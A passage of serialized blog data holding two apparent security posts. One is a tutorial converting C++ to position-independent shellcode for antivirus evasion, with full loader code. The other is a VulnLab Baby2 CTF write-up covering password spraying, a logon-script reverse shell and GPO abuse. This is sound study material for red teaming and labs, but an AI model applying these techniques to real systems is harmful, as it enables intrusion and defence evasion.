hacking!&quot;],&quot;filePath&quot;:[0,&quot;src/content/projects/waffles-crypt-modular-shellcode-encryption-and-obfuscation.mdx&quot;],&quot;digest&quot;:[0,&quot;50369bbde26da3d3&quot;],&quot;deferredRender&quot;:[0,true],&quot;collection&quot;:[0,&quot;projects&quot;],&quot;slug&quot;:[0,&quot;waffles-crypt-modular-shellcode-encryption-and-obfuscation&quot;],&quot;render&quot;:[0,null],&quot;imageMeta&quot;:[0,{&quot;src&quot;:[0,&quot;/_astro/waffles_crypt_encrypter.CaBs6730.png&quot;],&quot;width&quot;:[0,1285],&quot;height&quot;:[0,630],&quot;format&quot;:[0,&quot;png&quot;]}],&quot;isSuperseded&quot;:[0,false]}],[0,{&quot;id&quot;:[0,&quot;writing-custom-shellcode-cpp-to-asm-to-shellcode.mdx&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Writing custom Shellcode: C++ to ASM to Shellcode&quot;],&quot;date&quot;:[3,&quot;2024-08-10T00:00:00.000Z&quot;],&quot;image&quot;:[0,&quot;heroImages/writing-custom-shellcode.png&quot;],&quot;tags&quot;:[1,[[0,&quot;Shellcode&quot;],[0,&quot;ASM&quot;],[0,&quot;C++&quot;],[0,&quot;Red Team&quot;],[0,&quot;Malware Development&quot;],[0,&quot;Reverse Engineering&quot;],[0,&quot;Programming&quot;]]],&quot;description&quot;:[0,&quot;Learn how to easily write custom Shellcode by converting C++ to ASM to Shellcode.&quot;],&quot;featured&quot;:[0,0],&quot;projectSlug&quot;:[0]}],&quot;body&quot;:[0,&quot;import Image from &#39;src/components/ImageLocal.astro&#39;;\n\nWriting custom shellcode can make the process of evading AVs much easier. However, writing Assembly code line by line can be quite labour-intensive.\n\nA solution proposed in [Hasherezade](https://vxug.fakedoma.in/papers/VXUG/Exclusive/FromaCprojectthroughassemblytoshellcodeHasherezade.pdf)&#39;s paper is to first create a C/C++ program, then convert it to assembly code. After generating a `.exe` from this ASM code, you can extract the shellcode from the `.text` section.\n\nThis approach allows for easier development of custom shellcode, and we can directly use the shellcode with shellcode injection techniques.\n\nIn this post, I will use a Local Payload execution technique as an example.\n\n### 1\\. Preparing Dev Environment\n\n1\\. Search for VsDevCmd.bat. This file should be located at:\n\n```batch\n%ProgramFiles%\\Microsoft Visual Studio\\2022\\Community\\Common7\\Tools\n```\n\n2\\. You can start by running the following command:\n\n```batch\ncmd /k \&quot;C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\Tools\\VsDevCmd.bat\&quot;\n\n```\n\n- &lt;Image src=\&quot;images/0fa90745d1774fc2b5c1b60754e59b45.png\&quot; alt=\&quot;e17df2f1d0167b81c9c97606d4e43a3a.png\&quot; width=\&quot;509\&quot; height=\&quot;87\&quot;/&gt;\n\n### 2\\. Converting C++ to Assembly\n\nWe will convert this 2 C++ files to Assembly:\n\n- [file.cpp](#filecpp) - the program that pops a message box.\n    \n- [peb-lookup.h](#peb-lookup-header) - header file required by the `file.cpp`, which contains functions for resolving addresses for `LoadLibraryA` and `GetProcAddress`\n    \n\nUsing the Dev Environment from before, you can convert the C++ code to Assembly:\n\n- Don&#39;t forget to use the `x64` version of `cl.exe`.\n\n```batch\n\&quot;C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC\\14.40.33807\\bin\\Hostx64\\x64\\cl.exe\&quot; /c /FAs /GS- file.cpp\n```\n\n- &lt;Image src=\&quot;images/d907d7e7e57a4b3084032a66caf79514.png\&quot; alt=\&quot;c1097bb23a149697c2974341d09c805a.png\&quot; width=\&quot;650\&quot; height=\&quot;54\&quot;/&gt;\n\nThis should generate a `.asm` file:\n\n- &lt;Image src=\&quot;images/9f72ada722d54ba78ae8dd3ea3bc2079.png\&quot; alt=\&quot;3aabccf10419ebc335ba5b08f14081cd.png\&quot; width=\&quot;458\&quot; height=\&quot;86\&quot;/&gt;\n\n#### file.cpp\n\n```c++\n#include &lt;Windows.h&gt;\n#include \&quot;peb-lookup.h\&quot;\n\n// It&#39;s worth noting that strings can be defined inside the .text section:\n#pragma code_seg(\&quot;.text\&quot;)\nint main()\n{\n    // Stack based strings for libraries and functions the shellcode needs\n    wchar_t kernel32_dll_name[] = { &#39;k&#39;,&#39;e&#39;,&#39;r&#39;,&#39;n&#39;,&#39;e&#39;,&#39;l&#39;,&#39;3&#39;,&#39;2&#39;,&#39;.&#39;,&#39;d&#39;,&#39;l&#39;,&#39;l&#39;, 0 };\n    char load_lib_name[] = { &#39;L&#39;,&#39;o&#39;,&#39;a&#39;,&#39;d&#39;,&#39;L&#39;,&#39;i&#39;,&#39;b&#39;,&#39;r&#39;,&#39;a&#39;,&#39;r&#39;,&#39;y&#39;,&#39;A&#39;,0 };\n    char get_proc_name[] = { &#39;G&#39;,&#39;e&#39;,&#39;t&#39;,&#39;P&#39;,&#39;r&#39;,&#39;o&#39;,&#39;c&#39;,&#39;A&#39;,&#39;d&#39;,&#39;d&#39;,&#39;r&#39;,&#39;e&#39;,&#39;s&#39;,&#39;s&#39;, 0 };\n    char user32_dll_name[] = { &#39;u&#39;,&#39;s&#39;,&#39;e&#39;,&#39;r&#39;,&#39;3&#39;,&#39;2&#39;,&#39;.&#39;,&#39;d&#39;,&#39;l&#39;,&#39;l&#39;, 0 };\n    char message_box_name[] = { &#39;M&#39;,&#39;e&#39;,&#39;s&#39;,&#39;s&#39;,&#39;a&#39;,&#39;g&#39;,&#39;e&#39;,&#39;B&#39;,&#39;o&#39;,&#39;x&#39;,&#39;W&#39;, 0 };\n\n    // stack based strings to be passed to the messagebox win api\n    wchar_t msg_content[] = { &#39;H&#39;,&#39;e&#39;,&#39;l&#39;,&#39;l&#39;,&#39;o&#39;, &#39; &#39;, &#39;W&#39;,&#39;o&#39;,&#39;r&#39;,&#39;l&#39;,&#39;d&#39;,&#39;!&#39;, 0 };\n    wchar_t msg_title[] = { &#39;D&#39;,&#39;e&#39;,&#39;m&#39;,&#39;o&#39;,&#39;!&#39;, 0 };\n\n    // resolve kernel32 image base\n    LPVOID base = get_module_by_name((const LPWSTR)kernel32_dll_name);\n    if (!base) {\n        return 1;\n    }\n\n    // resolve loadlibraryA() address\n    LPVOID load_lib = get_func_by_name((HMODULE)base, (LPSTR)load_lib_name);\n    if (!load_lib) {\n        return 2;\n    }\n\n    // resolve getprocaddress() address\n    LPVOID get_proc = get_func_by_name((HMODULE)base, (LPSTR)get_proc_name);\n    if (!get_proc) {\n        return 3;\n    }\n\n    // loadlibrarya and getprocaddress function definitions\n    HMODULE(WINAPI * _LoadLibraryA)(LPCSTR lpLibFileName) = (HMODULE(WINAPI*)(LPCSTR))load_lib;\n    FARPROC(WINAPI * _GetProcAddress)(HMODULE hModule, LPCSTR lpProcName)\n        = (FARPROC(WINAPI*)(HMODULE, LPCSTR)) get_proc;\n\n    // load user32.dll\n    LPVOID u32_dll = _LoadLibraryA(user32_dll_name);\n\n    // messageboxw function definition\n    int (WINAPI * _MessageBoxW)(\n        _In_opt_ HWND hWnd,\n        _In_opt_ LPCWSTR lpText,\n        _In_opt_ LPCWSTR lpCaption,\n        _In_ UINT uType) = (int (WINAPI*)(\n            _In_opt_ HWND,\n            _In_opt_ LPCWSTR,\n            _In_opt_ LPCWSTR,\n            _In_ UINT)) _GetProcAddress((HMODULE)u32_dll, message_box_name);\n\n    if (_MessageBoxW == NULL) return 4;\n\n\n    // invoke the message box winapi\n    _MessageBoxW(0, msg_content, msg_title, MB_OK);\n\n    return 0;\n}\n```\n\n#### PEB-lookup header\n\n```c++\n#pragma once\n#include &lt;Windows.h&gt;\n\n#ifndef __NTDLL_H__\n\n#ifndef TO_LOWERCASE\n#define TO_LOWERCASE(out, c1) (out = (c1 &lt;= &#39;Z&#39; &amp;&amp; c1 &gt;= &#39;A&#39;) ? c1 = (c1 - &#39;A&#39;) + &#39;a&#39;: c1)\n#endif\n\n\ntypedef struct _UNICODE_STRING\n{\n    USHORT Length;\n    USHORT MaximumLength;\n    PWSTR  Buffer;\n\n} UNICODE_STRING, * PUNICODE_STRING;\n\ntypedef struct _PEB_LDR_DATA\n{\n    ULONG Length;\n    BOOLEAN Initialized;\n    HANDLE SsHandle;\n    LIST_ENTRY InLoadOrderModuleList;\n    LIST_ENTRY InMemoryOrderModuleList;\n    LIST_ENTRY InInitializationOrderModuleList;\n    PVOID      EntryInProgress;\n\n} PEB_LDR_DATA, * PPEB_LDR_DATA;\n\n//here we don&#39;t want to use any functions imported form extenal modules\n\ntypedef struct _LDR_DATA_TABLE_ENTRY {\n    LIST_ENTRY  InLoadOrderModuleList;\n    LIST_ENTRY  InMemoryOrderModuleList;\n    LIST_ENTRY  InInitializationOrderModuleList;\n    void* BaseAddress;\n    void* EntryPoint;\n    ULONG   SizeOfImage;\n    UNICODE_STRING FullDllName;\n    UNICODE_STRING BaseDllName;\n    ULONG   Flags;\n    SHORT   LoadCount;\n    SHORT   TlsIndex;\n    HANDLE  SectionHandle;\n    ULONG   CheckSum;\n    ULONG   TimeDateStamp;\n} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;\n\n\ntypedef struct _PEB\n{\n    BOOLEAN InheritedAddressSpace;\n    BOOLEAN ReadImageFileExecOptions;\n    BOOLEAN BeingDebugged;\n    BOOLEAN SpareBool;\n    HANDLE Mutant;\n\n    PVOID ImageBaseAddress;\n    PPEB_LDR_DATA Ldr;\n\n    // [...] this is a fragment, more elements follow here\n\n} PEB, * PPEB;\n\n#endif //__NTDLL_H__\n\ninline LPVOID get_module_by_name(WCHAR* module_name)\n{\n    PPEB peb = NULL;\n#if defined(_WIN64)\n    peb = (PPEB)__readgsqword(0x60);\n#else\n    peb = (PPEB)__readfsdword(0x30);\n#endif\n    PPEB_LDR_DATA ldr = peb-&gt;Ldr;\n    LIST_ENTRY list = ldr-&gt;InLoadOrderModuleList;\n\n    PLDR_DATA_TABLE_ENTRY Flink = *((PLDR_DATA_TABLE_ENTRY*)(&amp;list));\n    PLDR_DATA_TABLE_ENTRY curr_module = Flink;\n\n    while (curr_module != NULL &amp;&amp; curr_module-&gt;BaseAddress != NULL) {\n        if (curr_module-&gt;BaseDllName.Buffer == NULL) continue;\n        WCHAR* curr_name = curr_module-&gt;BaseDllName.Buffer;\n\n        size_t i = 0;\n        for (i = 0; module_name[i] != 0 &amp;&amp; curr_name[i] != 0; i++) {\n            WCHAR c1, c2;\n            TO_LOWERCASE(c1, module_name[i]);\n            TO_LOWERCASE(c2, curr_name[i]);\n            if (c1 != c2) break;\n        }\n        if (module_name[i] == 0 &amp;&amp; curr_name[i] == 0) {\n            //found\n            return curr_module-&gt;BaseAddress;\n        }\n        // not found, try next:\n        curr_module = (PLDR_DATA_TABLE_ENTRY)curr_module-&gt;InLoadOrderModuleList.Flink;\n    }\n    return NULL;\n}\n\ninline LPVOID get_func_by_name(LPVOID module, char* func_name)\n{\n    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)module;\n    if (idh-&gt;e_magic != IMAGE_DOS_SIGNATURE) {\n        return NULL;\n    }\n    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)module + idh-&gt;e_lfanew);\n    IMAGE_DATA_DIRECTORY* exportsDir = &amp;(nt_headers-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);\n    if (exportsDir-&gt;VirtualAddress == NULL) {\n        return NULL;\n    }\n\n    DWORD expAddr = exportsDir-&gt;VirtualAddress;\n    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(expAddr + (ULONG_PTR)module);\n    SIZE_T namesCount = exp-&gt;NumberOfNames;\n\n    DWORD funcsListRVA = exp-&gt;AddressOfFunctions;\n    DWORD funcNamesListRVA = exp-&gt;AddressOfNames;\n    DWORD namesOrdsListRVA = exp-&gt;AddressOfNameOrdinals;\n\n    //go through names:\n    for (SIZE_T i = 0; i &lt; namesCount; i++) {\n        DWORD* nameRVA = (DWORD*)(funcNamesListRVA + (BYTE*)module + i * sizeof(DWORD));\n        WORD* nameIndex = (WORD*)(namesOrdsListRVA + (BYTE*)module + i * sizeof(WORD));\n        DWORD* funcRVA = (DWORD*)(funcsListRVA + (BYTE*)module + (*nameIndex) * sizeof(DWORD));\n\n        LPSTR curr_name = (LPSTR)(*nameRVA + (BYTE*)module);\n        size_t k = 0;\n        for (k = 0; func_name[k] != 0 &amp;&amp; curr_name[k] != 0; k++) {\n            if (func_name[k] != curr_name[k]) break;\n        }\n        if (func_name[k] == 0 &amp;&amp; curr_name[k] == 0) {\n            //found\n            return (BYTE*)module + (*funcRVA);\n        }\n    }\n    return NULL;\n}\n```\n\n### 3\\. Fixing the .asm file\n\nAfter converting the C++ code to assembly, we need to clean up the file a bit, so we can link it to an .exe without errors and to avoid the shellcode from crashing.\n\nSpecifically, we need to:\n\n1.  [Remove dependencies from external libraries](#31-remove-dependencies-from-external-libraries)\n2.  [Fix Stack Alignment](#32-fix-stack-alignment)\n3.  [Remove PDATA and XDATA Segments](#33-remove-pdata-and-xdata-segments)\n4.  [Fix Syntax Issues](#34-fix-syntax-issues)\n\n#### 3.1 Remove dependencies from external libraries\n\nRemove or comment out the libraries `LIBCMT` and `OLDNAMES`.\n\n- &lt;Image src=\&quot;images/fb173d4b4acd4da3bc0537167eeb8bdc.png\&quot; alt=\&quot;78a72023f71401504817b08850f75281.png\&quot; width=\&quot;472\&quot; height=\&quot;137\&quot;/&gt;\n\n#### 3.2 Fix Stack Alignment\n\nAdd procedure `AlignRSP` right at the top of the first `_TEXT` segment in our `c-shellcode.asm`:\n\n```\n; https://github.com/mattifestation/PIC_Bindshell/blob/master/PIC_Bindshell/AdjustStack.asm\n\n; AlignRSP is a simple call stub that ensures that the stack is 16-byte aligned prior\n; to calling the entry point of the payload. This is necessary because 64-bit functions\n; in Windows assume that they were called with 16-byte stack alignment. When amd64\n; shellcode is executed, you can&#39;t be assured that you stack is 16-byte aligned. For example,\n; if your shellcode lands with 8-byte stack alignment, any call to a Win32 function will likely\n; crash upon calling any ASM instruction that utilizes XMM registers (which require 16-byte)\n; alignment.\n\nAlignRSP PROC\n    push rsi ; Preserve RSI since we&#39;re stomping on it\n    mov rsi, rsp ; Save the value of RSP so it can be restored\n    and rsp, 0FFFFFFFFFFFFFFF0h ; Align RSP to 16 bytes\n    sub rsp, 020h ; Allocate homing space for ExecutePayload\n    call main ; Call the entry point of the payload\n    mov rsp, rsi ; Restore the original value of RSP\n    pop rsi ; Restore RSI\n    ret ; Return to caller\nAlignRSP ENDP\n```\n\n#### 3.3 Remove PDATA and XDATA Segments\n\nRemove or comment out `PDATA` and `XDATA` segments as shown below:\n\n- &lt;Image src=\&quot;images/3d367ab75f66426fb177102b8b906669.png\&quot; alt=\&quot;bfa537cf43a3812de7f5f4882809f9d4.png\&quot; width=\&quot;385\&quot; height=\&quot;229\&quot; /&gt;\n\n#### 3.4 Fix Syntax Issues\n\nNow, we just need to fix the syntax issues.\n\nWe can use the error we get while linking the MASM file to an EXE to assist in fixing syntax.\n\nPossible errors:\n\n- `error A2027`: operand must be a memory expression\n    - Cause: `mov rax, QWORD PTR gs:96`\n    - Solution: Add square brackets `[]`\n    - `mov rax, QWORD PTR gs:[96]`\n- `error A2006`: undefined symbol : FLAT\n    - Cause: `lea r8, OFFSET FLAT:$SG93137`\n    - Solution: Remove `:FLAT`\n    - `lea r8, OFFSET $SG93137`\n- `error LNK2019`: unresolved external symbol `__imp_MessageBoxA` referenced in function main file.exe : fatal error LNK1120: 1 unresolved externals\n    - Cause: missing user32.lib\n    - Solution: Add the following line to the ASM code `includelib user32.lib`.\n    - Note: This should happen because we loaded the library in the C++ code.\n    - Ensure the `libpath` is pointing to x64 version. So, add this flag to the cl.exe command:\n    - `/LIBPATH:\&quot;C:\\Program Files (x86)\\Windows Kits\\10\\Lib\\10.0.22621.0\\um\\x64\&quot;`\n\n### 4\\. Linking the ASM code to an EXE\n\nNow, you need to link the assembly listings inside `file.asm` to get an executable `file.exe`:\n\n```batch\n\&quot;C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC\\14.40.33807\\bin\\Hostx64\\x64\\ml64.exe\&quot; file.asm /link /entry:AlignRSP\n```\n\n- &lt;Image src=\&quot;images/144c60e77c7b41a29bee437952541052.png\&quot; alt=\&quot;c919fdc18fb391df6c4146918bd590fc.png\&quot; width=\&quot;559\&quot; height=\&quot;115\&quot;/&gt;\n\n### 5\\. Testing the EXE\n\nTo check if the last step was successful, try running the `file.exe` that was created from the `file.asm`.\n\n- &lt;Image src=\&quot;images/415c0afb4ddd40ddbfe4df7af6a6dd48.png\&quot; alt=\&quot;c28b6e89743b8d1ce7337f9057f3d7bc.png\&quot; width=\&quot;413\&quot; height=\&quot;204\&quot; /&gt;\n\n### 6\\. Copying and Running the Shellcode from the EXE\n\nNow that we have a working exe, we can extract the shellcode and execute it using any Payload execution techniques.\n\nWe can use an hex editor to extract the shellcode from the `.text` section.\n\nI will use [CFF Explorer](https://ntcore.com/explorer-suite/) in this case.\n\n1.  Find the Raw Address of `.text` and `.rdata` section:\n    - For me, the start of `.text` was at `0x200` and for `.rdata` at `0xA00`\n    - &lt;Image src=\&quot;images/e118b9c601874d369b21fbbae7c46310.png\&quot; alt=\&quot;7b52718224179a7e4137ab1a3bb64879.png\&quot; width=\&quot;604\&quot; height=\&quot;86\&quot; /&gt;\n2.  Go to Hex editor, and scroll down until the offset corresponds to the Raw Address you found earlier.\n    - This will be the start of your shellcode:\n    - &lt;Image src=\&quot;images/4e0f70d89f004864b8e642662ec9aeed.png\&quot; alt=\&quot;df11b9fe1532a12a8c3cb43c42170f9b.png\&quot; width=\&quot;451\&quot; height=\&quot;171\&quot; /&gt;\n3.  Copy the shellcode starting at the raw address of `.text` and stopping before the raw address of `.rdata`.\n    - For me, it was from `0x200` to `0x9F0`.\n    - Note: `0x9F0` is the address before `0xA00`, `.rdata` address.\n    - &lt;Image src=\&quot;images/a6febd158d6f443699edd3ba118a730a.png\&quot; alt=\&quot;348c88458956786d792937260878ce5f.png\&quot; width=\&quot;352\&quot; height=\&quot;244\&quot; /&gt;\n4.  Since I&#39;m going to use this shellcode on a C/C++ script, I can copy it to C/C++ array:\n    - &lt;Image src=\&quot;images/da74d444ac9a4da98429ce65ab2fd311.png\&quot; alt=\&quot;a091074a5b951420fdfdf07c72d178e8.png\&quot; width=\&quot;136\&quot; height=\&quot;140\&quot; /&gt;\n5.  You can use this shellcode with a shellcode injection techniques.\n6.  In this case, I used the Local Payload Execution technique from [Maldev academy](https://maldevacademy.com/).\n    - &lt;Image src=\&quot;images/fd5a8b62eb544589b9f727f10bec9b5f.png\&quot; alt=\&quot;5e307e12025fc94dd6bdff1af77d84d4.png\&quot; width=\&quot;607\&quot; height=\&quot;216\&quot;/&gt;\n\n### References\n\n1.  [https://medium.com/@shaddy43/the-epitome-of-evasion-a-custom-shellcode-c751a1a17e5b](https://medium.com/@shaddy43/the-epitome-of-evasion-a-custom-shellcode-c751a1a17e5b)\n2.  [https://www.ired.team/offensive-security/code-injection-process-injection/writing-and-compiling-shellcode-in-c](https://www.ired.team/offensive-security/code-injection-process-injection/writing-and-compiling-shellcode-in-c)&quot;],&quot;filePath&quot;:[0,&quot;src/content/posts/writing-custom-shellcode-cpp-to-asm-to-shellcode.mdx&quot;],&quot;digest&quot;:[0,&quot;b416ca64985f8600&quot;],&quot;deferredRender&quot;:[0,true],&quot;collection&quot;:[0,&quot;posts&quot;],&quot;slug&quot;:[0,&quot;writing-custom-shellcode-cpp-to-asm-to-shellcode&quot;],&quot;render&quot;:[0,null],&quot;imageMeta&quot;:[0,{&quot;src&quot;:[0,&quot;/_astro/writing-custom-shellcode.BMfL58rv.png&quot;],&quot;width&quot;:[0,1286],&quot;height&quot;:[0,630],&quot;format&quot;:[0,&quot;png&quot;]}],&quot;isSuperseded&quot;:[0,false]}],[0,{&quot;id&quot;:[0,&quot;writeup-vulnlab-baby2.mdx&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Write-up: VulnLab - Baby2 (Machine)&quot;],&quot;date&quot;:[3,&quot;2024-08-09T00:00:00.000Z&quot;],&quot;image&quot;:[0,&quot;heroImages/baby2-machine.png&quot;],&quot;tags&quot;:[1,[[0,&quot;Write-up&quot;],[0,&quot;CTF&quot;],[0,&quot;Red Team&quot;],[0,&quot;Walkthrough&quot;],[0,&quot;VulnLab&quot;],[0,&quot;AD Pentest&quot;],[0,&quot;ACL&quot;],[0,&quot;VBS&quot;],[0,&quot;PowerShell&quot;],[0,&quot;Active Directory&quot;],[0,&quot;Hacking&quot;]]],&quot;description&quot;:[0,&quot;Write-up for VulnLab&#39;s Baby2 (Machine).&quot;],&quot;featured&quot;:[0,0],&quot;projectSlug&quot;:[0]}],&quot;body&quot;:[0,&quot;import Image from &#39;src/components/ImageLocal.astro&#39;;\n\n\n## Machine Info\n\n- Machine Name: Baby2\n- Type: Active Directory CTF\n- Difficulty: Medium\n- Link to Wiki: [VulnLabs Baby2 Wiki](https://wiki.vulnlab.com/guidance/medium/baby2)\n\n## Description\n- Initial Access: Use an exposed SMB share to create a username wordlist and perform password spraying.\n- First Reverse Shell: Modify the Domain Login Script to gain a reverse shell.\n- Privilege Escalation: Abuse DACLs and Group Policy Objects (GPOs) to elevate privileges.\n\n## Nmap\n\nI used Nmap to scan for open ports using the command below:\n\n```bash\nexport ip=10.10.140.85-86\nports=$(sudo nmap -sS -p- --min-rate=1000 -T4 $ip -o nmap-alltcp.txt | grep -oP \&quot;^\\d+\&quot; | tr \&quot;\\n\&quot; \&quot;,\&quot; | sed &#39;s/,$//&#39;);sudo nmap -sS -sV -sC -O -T4 $ip -p$ports | grep -vP \&quot;closed|filtered\&quot; &gt; nmap-enum.txt\n```\n\n```\nNmap scan report for 10.10.117.94\nHost is up (0.038s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain?\n| fingerprint-strings: \n|   DNSVersionBindReqTCP: \n|     version\n|_    bind\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc.baby2.vl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.baby2.vl\n| Not valid before: 2023-08-22T17:39:15\n|_Not valid after:  2024-08-21T17:39:15\n|_ssl-date: 2024-06-27T14:19:20+00:00; 0s from scanner time.\n3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: BABY2\n|   NetBIOS_Domain_Name: BABY2\n|   NetBIOS_Computer_Name: DC\n|   DNS_Domain_Name: baby2.vl\n|   DNS_Computer_Name: dc.baby2.vl\n|   DNS_Tree_Name: baby2.vl\n|   Product_Version: 10.0.20348\n|_  System_Time: 2024-06-27T14:18:40+00:00\n| ssl-cert: Subject: commonName=dc.baby2.vl\n| Not valid before: 2024-06-26T14:12:24\n|_Not valid after:  2024-12-26T14:12:24\n|_ssl-date: 2024-06-27T14:19:20+00:00; 0s from scanner time.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n49667/tcp open  msrpc         Microsoft Windows RPC\n49668/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49675/tcp open  msrpc         Microsoft Windows RPC\n61367/tcp open  msrpc         Microsoft Windows RPC\n61375/tcp open  msrpc         Microsoft Windows RPC\n61390/tcp open  msrpc         Microsoft Windows RPC\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port53-TCP:V=7.80%I=7%D=6/27%Time=667D7439%P=x86_64-pc-linux-gnu%r(DNSV\nSF:ersionBindReqTCP,20,\&quot;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\\nSF:x04bind\\0\\0\\x10\\0\\x03\&quot;);\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2016 (85%)\nOS CPE: cpe:/o:microsoft:windows_server_2016\nAggressive OS guesses: Microsoft Windows Server 2016 (85%)\nNo exact OS matches for host (test conditions non-ideal).\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2024-06-27T14:18:42\n|_  start_date: N/A\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n```\n\n## Initial Compromise\n\n### Password spray\n\nThe SMB Share `\&quot;homes\&quot;` allows Guest users to read and write:\n\n- &lt;Image src=\&quot;images/ae12559294834ea3976680c7f16a9606.png\&quot; alt=\&quot;007b53411ada3c32077a75aa69dbfb20.png\&quot; width=\&quot;423\&quot; height=\&quot;112\&quot; /&gt;\n\nInside the `\&quot;homes\&quot;` share, we get a list of all the users.\n\n```bash\nsmbclient --no-pass //10.10.117.94/homes\n```\n\n- &lt;Image src=\&quot;images/11d67aa204ff45c5a9d0a634981ebc52.png\&quot; alt=\&quot;1a5a2797766b298d3f83aa47af273b2f.png\&quot; width=\&quot;399\&quot; height=\&quot;164\&quot; /&gt;\n\nWe can use this list of users to create a username wordlist, and password spray each account by using the username as password:\n\n- &lt;Image src=\&quot;images/276ce5083a91447c851602b655eaf5c2.png\&quot; alt=\&quot;8eacce5301aff35aa3dab999c504afff.png\&quot; width=\&quot;551\&quot; height=\&quot;222\&quot; /&gt;\n\nThis gave us access to the users: `Carl.Moore`, `library`.\n\n- &lt;Image src=\&quot;images/2d71cffd9660433595191f06456827a2.png\&quot; alt=\&quot;b46e2a879320cc70bbd600279b13e40b.png\&quot; width=\&quot;536\&quot; height=\&quot;153\&quot; /&gt;\n\n### Reverse shell via login.vbs\n\nThe accounts from before have permission to modify the `login.vbs` script, which is located in the SYSVOL share at `/baby.vl/scripts`.\n\nThis `login.vbs` is a Domain Logon Script, and is normally created in Active Directory Environments to run scripts when a user logins, just as its name suggests.\n\nWe can exploit this by altering the contents of `login.vbs` to a VBS script that downloads and executes in memory a reverse PowerShell shell.\n\n- &lt;Image src=\&quot;images/6656930421b6469ea538f810d5672ca5.png\&quot; alt=\&quot;1549de0e66fe39cc4d61315a5861b5c5.png\&quot; width=\&quot;533\&quot; height=\&quot;81\&quot; /&gt;\n- &lt;Image src=\&quot;images/1501fa2fda44465295efdc62241f3aa7.png\&quot; alt=\&quot;d6f2eb6b955803e815075335040a1207.png\&quot; width=\&quot;565\&quot; height=\&quot;53\&quot; /&gt;\n- &lt;Image src=\&quot;images/4f367c5932a14667932764bcf4dbefd0.png\&quot; alt=\&quot;8457bec8d2d7f4aeb852e5d5596af30f.png\&quot; width=\&quot;503\&quot; height=\&quot;67\&quot; /&gt;\n\nWith this we got our first shell, and access to the user `amelia.griffiths`.\n\n- &lt;Image src=\&quot;images/e8025ff934e9453ab397b9e82353cb67.png\&quot; alt=\&quot;ae7e5bed030e71d5f6366731e1bde72a.png\&quot; width=\&quot;388\&quot; height=\&quot;150\&quot; /&gt;\n\nThe user flag can be found in Amelia&#39;s Desktop folder.\n\n## Privilege Escalation\n\n### User group has WriteDACL rights on GPO Admin\n\nBy running PowerView&#39;s `Invoke-AclScanner`, we can see any user belonging to the Legacy group, has WriteDACL rights on the GPO Admin.\n\n- &lt;Image src=\&quot;images/8a782f3903a5485daf415fc317b50814.png\&quot; alt=\&quot;\&quot; width=\&quot;418\&quot; height=\&quot;229\&quot; /&gt;\n- &lt;Image src=\&quot;images/f4d04ec4a3e746b0b86d764d70a3e67a.png\&quot; alt=\&quot;\&quot; width=\&quot;376\&quot; height=\&quot;255\&quot; /&gt;\n\n`amelia.griffiths` belongs to the legacy group, so we can exploit this by changing GPO Admin&#39;s password:\n\n- &lt;Image src=\&quot;images/e527f375d600424789142c39b0d3cbed.png\&quot; alt=\&quot;f256b3bec64058d33b6696fbcd474353.png\&quot; width=\&quot;523\&quot; height=\&quot;27\&quot; /&gt;\n- &lt;Image src=\&quot;images/5a44d51ee8d94370a9dde65f7a2a157b.png\&quot; alt=\&quot;2a82b0a39fa0050f0f0abae96febd2f9.png\&quot; width=\&quot;285\&quot; height=\&quot;41\&quot; /&gt;\n\n### Create Malicious GPO to escalate privileges\n\nIf we run bloodhound, it suggests a Domain Privilege escalation path by using `pyGPOAbuse.py`.\n\n- &lt;Image src=\&quot;images/dd5beaebc50b44b09ddf0d29570e0f0c.png\&quot; alt=\&quot;0f1f2fca5753d3de5eb83ce4623be42d.png\&quot; width=\&quot;326\&quot; height=\&quot;208\&quot; /&gt;\n\nSince, we now have full control over the GPO Admin, we can use this to create an evil policy that will schedule task to add `gpoadm` to the administrators local group administrator.\n\n- &lt;Image src=\&quot;images/e79ad906e72043589569dd4be8c66d3b.png\&quot; alt=\&quot;e771765b932b0c6290926cf481cf031f.png\&quot; width=\&quot;550\&quot; height=\&quot;60\&quot; /&gt;\n\nWe can now use a Pass the Pass technique, e.g. via Impacket&#39;s `psexec.py`, to login as `gpoadm` and grab the root flag, which is located at the Administrators folder.\n\n- &lt;Image src=\&quot;images/a2e02ef87dc940a1ba38b415ea552c04.png\&quot; 